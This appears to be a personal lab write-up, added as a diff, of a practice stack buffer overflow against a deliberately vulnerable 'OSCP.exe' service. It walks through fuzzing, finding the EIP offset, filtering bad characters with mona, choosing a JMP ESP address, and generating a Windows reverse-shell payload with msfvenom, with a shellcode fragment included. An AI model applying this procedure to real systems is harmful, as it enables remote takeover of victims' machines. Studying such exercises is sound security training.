@@ -1,0 +1,86 @@
+Lets first RDP...
+Run Immunity As Admin
+Open OSCP.exe
+Failed. Ran Program as admin and attached it to immunity. Worked
+Connect:
+
+nc <IP> 1337
+
+We get to a service. Asks for input. 
+Prefix: OVERFLOW1
+
+ran fuzzer.py
+Crashed at 2000 Bytes
+This. XFREERDP. IS. TEASING. MEEEEEEEEE
+
+Finding Exact Offset:
+
+command:
+
+/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 3000
+
+Copy and paste the output to exploit.py(In the payload variable)
+
+Now, copy the eip(6F43396E)
+
+/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q <eip>
+
+This should give you the exact offset. for me, it is 1978
+
+Fuzzing. Complete!
+
+Now, finding bad char:
+
+Run: !mona bytearray -b "\x00" In Immunity
+
+Run the badchars.py first.
+Copy the output to the payload section. And be sure to set the offset. 
+Now run the exploit.py
+Now Run:
+
+!mona compare -f C:\mona\oscp\bytearray.bin -a esp
+
+Now, I found: 00, 07, 08, 2e, 2f, a0, a1
+
+Filtering:
+
+Now Not All Of There Are Bad Chars. Now, next step is edit your exploit and remove the first bad char from the payload. and run the mona bytearray command again with lik, \x00\x22\x32 (Not 00!!. The Second)
+Keep removing one by one till there are no left. 
+
+In the first try, i removed 07 and 08 was automatically removed! Go on!
+In the second try, 2f was removed!
+Now, after some tries, mona give me, Unmodified, Normal. Done!!! We Found The Badchars!: \x00\x07\x2e\xa0
+
+Badchars, Done!
+
+Now, Gaining Root:
+
+Now, run:
+
+!mona jmp -r esp -cpb "\x00\x07\x2e\xa0"
+
+Now, choose one of them. 
+
+I choose:
+625011af
+
+Now run:
+
+msfvenom -p windows/shell_reverse_tcp LHOST=YOUR_IP LPORT=4444 EXITFUNC=thread -b "\x00\x07\x2e\xa0" -f py
+
+Copy the output, and remove b from every line, like:
+
+buf =  ""
+buf += "\xbe\xb8\x70\xc7\xc9\xdb\xdc\xd9\x74\x24\xf4\x58\x33"
+
+Now, paste it to the payload variable of the exploit script
+Be sure to change retn to the jmp esp (625011af) but like: \xaf\x11\x50\x62
+You need to do some more changes...
+Also, add padding as:
+
+padding = "\x90" * 16
+
+At last, there are many changes. Check my exploit.py for details. Setup a listener And Run.
+DONE!!!!!!!!!!!!!!!!
+
+I should tell you that this was OVERFLOW1. Do all others on your own. Thanks for reading!
